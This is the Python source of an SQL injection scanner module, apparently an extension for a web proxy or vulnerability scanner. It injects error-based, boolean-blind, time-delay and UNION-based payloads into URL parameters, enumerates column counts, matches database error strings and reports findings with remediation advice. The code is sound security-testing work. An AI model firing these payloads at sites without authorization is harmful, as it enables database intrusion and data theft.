"""SQL Injection Advanced — boolean blind, time blind, and UNION-based injection across URL params."""

from __future__ import annotations

import logging
import time
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from models import ScanFinding

log = logging.getLogger("proxy-engine.ext.sqli-advanced")

NAME = "sqli-advanced"
DESCRIPTION = "Boolean blind, time blind (SLEEP/BENCHMARK), and UNION-based SQL injection on all URL params"
CHECK_TYPE = "active"
ENABLED = False

_config: dict[str, Any] = {
    "timeout": 15.0,
    "time_threshold": 4.0,  # seconds — flag if response takes >= this
    "max_union_columns": 20,
}

# SQL error patterns across database engines
SQL_ERRORS = [
    # MySQL
    "you have an error in your sql syntax",
    "mysql_fetch", "mysql_num_rows", "mysql_query",
    "warning: mysql",
    # PostgreSQL
    "pg_query", "pg_exec", "PG::SyntaxError",
    "unterminated quoted string",
    "syntax error at or near",
    # MSSQL
    "microsoft sql native client error",
    "unclosed quotation mark after the character string",
    "mssql_query",
    "microsoft ole db provider for sql server",
    "[microsoft][odbc sql server driver]",
    # SQLite
    "sqlite3.operationalerror",
    "sqlite_error", "near \"",
    "unrecognized token",
    # Oracle
    "ora-01756", "ora-00933", "ora-06512",
    "oracle error", "quoted string not properly terminated",
    # Generic
    "sql syntax", "sqlstate", "sql command not properly ended",
    "invalid query", "sql error",
]


def configure(config: dict) -> dict:
    _config.update(config)
    return {"status": "configured", "config": _config}


def get_state() -> dict:
    return {"config": _config}


async def active_check(url: str) -> list[ScanFinding]:
    """Test all URL parameters for SQL injection."""
    findings: list[ScanFinding] = []
    timeout = _config.get("timeout", 15.0)

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if not params:
        # No query params — test common param names
        params = {"id": ["1"], "page": ["1"], "q": ["test"]}

    async with httpx.AsyncClient(verify=False, timeout=timeout) as client:
        # Get baseline
        try:
            baseline_start = time.monotonic()
            baseline = await client.get(url)
            baseline_time = time.monotonic() - baseline_start
        except Exception as e:
            log.debug(f"Baseline request failed: {e}")
            return findings

        for param_name, param_values in params.items():
            original_value = param_values[0] if param_values else "1"

            # Error-based detection
            findings.extend(await _test_error_based(
                client, url, parsed, params, param_name, original_value, baseline
            ))

            # Boolean blind detection
            findings.extend(await _test_boolean_blind(
                client, url, parsed, params, param_name, original_value, baseline
            ))

            # Time blind detection
            findings.extend(await _test_time_blind(
                client, url, parsed, params, param_name, original_value, baseline_time
            ))

            # UNION-based detection
            findings.extend(await _test_union_based(
                client, url, parsed, params, param_name, original_value, baseline
            ))

    return findings


def _build_url(parsed, params: dict, param_name: str, payload: str) -> str:
    """Build URL with injected parameter."""
    test_params = {k: v[:] for k, v in params.items()}
    test_params[param_name] = [payload]
    new_query = urlencode(test_params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _has_sql_error(body: str) -> str | None:
    """Check if response contains SQL error messages."""
    body_lower = body.lower()
    for error in SQL_ERRORS:
        if error.lower() in body_lower:
            return error
    return None


async def _test_error_based(
    client: httpx.AsyncClient, url: str, parsed, params: dict,
    param_name: str, original_value: str, baseline: httpx.Response,
) -> list[ScanFinding]:
    """Test for error-based SQL injection."""
    findings: list[ScanFinding] = []

    error_payloads = [
        f"{original_value}'",
        f"{original_value}\"",
        f"{original_value}'--",
        f"{original_value}' OR '",
        f"{original_value}\\",
        f"{original_value}') OR ('1'='1",
    ]

    for payload in error_payloads:
        test_url = _build_url(parsed, params, param_name, payload)
        try:
            resp = await client.get(test_url)
            error = _has_sql_error(resp.text)

            if error and not _has_sql_error(baseline.text):
                findings.append(ScanFinding(
                    template_id="sqli_error_based",
                    name=f"SQL Injection (Error-Based) in '{param_name}'",
                    severity="high",
                    url=url,
                    matched_at=test_url,
                    description=(
                        f"SQL error message detected in response after injecting payload "
                        f"in parameter '{param_name}'. Error: '{error}'. "
                        f"Payload: {payload}"
                    ),
                    extracted=[
                        f"Parameter: {param_name}",
                        f"Payload: {payload}",
                        f"Error: {error}",
                        f"Status: {resp.status_code}",
                    ],
                    source="extension",
                    confidence="confirmed",
                    remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                ))
                return findings

        except Exception as e:
            log.debug(f"Error-based test error: {e}")

    return findings


async def _test_boolean_blind(
    client: httpx.AsyncClient, url: str, parsed, params: dict,
    param_name: str, original_value: str, baseline: httpx.Response,
) -> list[ScanFinding]:
    """Test for boolean-based blind SQL injection."""
    findings: list[ScanFinding] = []

    # True condition should return same content as baseline
    # False condition should return different content
    true_payloads = [
        (f"{original_value}' AND '1'='1", f"{original_value}' AND '1'='2"),
        (f"{original_value} AND 1=1", f"{original_value} AND 1=2"),
        (f"{original_value}' AND 1=1--", f"{original_value}' AND 1=2--"),
        (f"{original_value}') AND ('1'='1", f"{original_value}') AND ('1'='2"),
    ]

    for true_payload, false_payload in true_payloads:
        true_url = _build_url(parsed, params, param_name, true_payload)
        false_url = _build_url(parsed, params, param_name, false_payload)

        try:
            true_resp = await client.get(true_url)
            false_resp = await client.get(false_url)

            # Compare: true should match baseline, false should differ
            true_matches_baseline = (
                true_resp.status_code == baseline.status_code
                and abs(len(true_resp.text) - len(baseline.text)) < 50
            )
            false_differs = (
                false_resp.status_code != baseline.status_code
                or abs(len(false_resp.text) - len(baseline.text)) > 50
            )

            if true_matches_baseline and false_differs:
                findings.append(ScanFinding(
                    template_id="sqli_boolean_blind",
                    name=f"SQL Injection (Boolean Blind) in '{param_name}'",
                    severity="high",
                    url=url,
                    matched_at=true_url,
                    description=(
                        f"Boolean blind SQLi detected in '{param_name}'. "
                        f"True condition ({true_payload}) matches baseline "
                        f"({true_resp.status_code}, {len(true_resp.text)} bytes), "
                        f"but false condition ({false_payload}) differs "
                        f"({false_resp.status_code}, {len(false_resp.text)} bytes)."
                    ),
                    extracted=[
                        f"Parameter: {param_name}",
                        f"True payload: {true_payload}",
                        f"False payload: {false_payload}",
                        f"Baseline: {baseline.status_code} / {len(baseline.text)}b",
                        f"True: {true_resp.status_code} / {len(true_resp.text)}b",
                        f"False: {false_resp.status_code} / {len(false_resp.text)}b",
                    ],
                    source="extension",
                    confidence="firm",
                    remediation="Use parameterized queries. Implement input validation.",
                ))
                return findings

        except Exception as e:
            log.debug(f"Boolean blind test error: {e}")

    return findings


async def _test_time_blind(
    client: httpx.AsyncClient, url: str, parsed, params: dict,
    param_name: str, original_value: str, baseline_time: float,
) -> list[ScanFinding]:
    """Test for time-based blind SQL injection."""
    findings: list[ScanFinding] = []
    threshold = _config.get("time_threshold", 4.0)

    time_payloads = [
        # MySQL
        f"{original_value}' AND SLEEP(5)--",
        f"{original_value} AND SLEEP(5)",
        f"{original_value}'; WAITFOR DELAY '0:0:5'--",
        # MSSQL
        f"{original_value}'; WAITFOR DELAY '0:0:5'--",
        # PostgreSQL
        f"{original_value}'; SELECT pg_sleep(5)--",
        f"{original_value}' AND (SELECT * FROM (SELECT pg_sleep(5)) a)--",
        # MySQL BENCHMARK alternative
        f"{original_value}' AND BENCHMARK(5000000,SHA1('test'))--",
    ]

    for payload in time_payloads:
        test_url = _build_url(parsed, params, param_name, payload)
        try:
            start = time.monotonic()
            resp = await client.get(test_url)
            elapsed = time.monotonic() - start

            if elapsed >= threshold and elapsed > (baseline_time * 3):
                findings.append(ScanFinding(
                    template_id="sqli_time_blind",
                    name=f"SQL Injection (Time Blind) in '{param_name}'",
                    severity="high",
                    url=url,
                    matched_at=test_url,
                    description=(
                        f"Time-based blind SQLi detected in '{param_name}'. "
                        f"Payload '{payload}' caused {elapsed:.1f}s delay "
                        f"(baseline: {baseline_time:.1f}s). "
                        f"Threshold: {threshold}s."
                    ),
                    extracted=[
                        f"Parameter: {param_name}",
                        f"Payload: {payload}",
                        f"Response time: {elapsed:.2f}s",
                        f"Baseline time: {baseline_time:.2f}s",
                    ],
                    source="extension",
                    confidence="firm",
                    remediation="Use parameterized queries. Never concatenate user input into SQL.",
                ))
                return findings

        except httpx.ReadTimeout:
            # Timeout itself is a strong indicator
            findings.append(ScanFinding(
                template_id="sqli_time_blind_timeout",
                name=f"SQL Injection (Time Blind - Timeout) in '{param_name}'",
                severity="high",
                url=url,
                matched_at=test_url,
                description=(
                    f"Request timed out after injecting time-delay payload in '{param_name}'. "
                    f"Payload: {payload}. Strong indicator of time-based blind SQLi."
                ),
                extracted=[
                    f"Parameter: {param_name}",
                    f"Payload: {payload}",
                    "Result: timeout",
                ],
                source="extension",
                confidence="firm",
                remediation="Use parameterized queries / prepared statements.",
            ))
            return findings
        except Exception as e:
            log.debug(f"Time blind test error: {e}")

    return findings


async def _test_union_based(
    client: httpx.AsyncClient, url: str, parsed, params: dict,
    param_name: str, original_value: str, baseline: httpx.Response,
) -> list[ScanFinding]:
    """Test for UNION-based SQL injection."""
    findings: list[ScanFinding] = []
    max_cols = _config.get("max_union_columns", 20)

    # First, determine number of columns using ORDER BY
    num_columns = None
    for i in range(1, max_cols + 1):
        payload = f"{original_value}' ORDER BY {i}--"
        test_url = _build_url(parsed, params, param_name, payload)
        try:
            resp = await client.get(test_url)
            error = _has_sql_error(resp.text)
            if error and "order" in error.lower():
                num_columns = i - 1
                break
            # Status code change can also indicate column count exceeded
            if resp.status_code != baseline.status_code and i > 1:
                num_columns = i - 1
                break
        except Exception:
            continue

    if not num_columns or num_columns < 1:
        # Try UNION SELECT NULL approach directly
        for cols in [1, 2, 3, 5, 10]:
            nulls = ",".join(["NULL"] * cols)
            payload = f"{original_value}' UNION SELECT {nulls}--"
            test_url = _build_url(parsed, params, param_name, payload)
            try:
                resp = await client.get(test_url)
                if resp.status_code == baseline.status_code:
                    if len(resp.text) != len(baseline.text):
                        num_columns = cols
                        break
            except Exception:
                continue

    if num_columns and num_columns > 0:
        # Confirm with UNION SELECT
        nulls = ",".join(["NULL"] * num_columns)
        marker = "sqli_union_marker_9x7k"
        # Replace one NULL with our marker
        union_values = ["NULL"] * num_columns
        union_values[0] = f"'{marker}'"
        union_str = ",".join(union_values)

        payload = f"{original_value}' UNION SELECT {union_str}--"
        test_url = _build_url(parsed, params, param_name, payload)

        try:
            resp = await client.get(test_url)
            if marker in resp.text:
                findings.append(ScanFinding(
                    template_id="sqli_union_based",
                    name=f"SQL Injection (UNION-Based) in '{param_name}'",
                    severity="critical",
                    url=url,
                    matched_at=test_url,
                    description=(
                        f"UNION-based SQLi confirmed in '{param_name}'. "
                        f"Table has {num_columns} columns. Marker '{marker}' reflected in response. "
                        f"Full database extraction is possible."
                    ),
                    extracted=[
                        f"Parameter: {param_name}",
                        f"Columns: {num_columns}",
                        f"Payload: {payload}",
                        f"Marker reflected: YES",
                    ],
                    source="extension",
                    confidence="confirmed",
                    remediation="Use parameterized queries. Implement least-privilege database access.",
                ))
        except Exception as e:
            log.debug(f"UNION test error: {e}")

    return findings
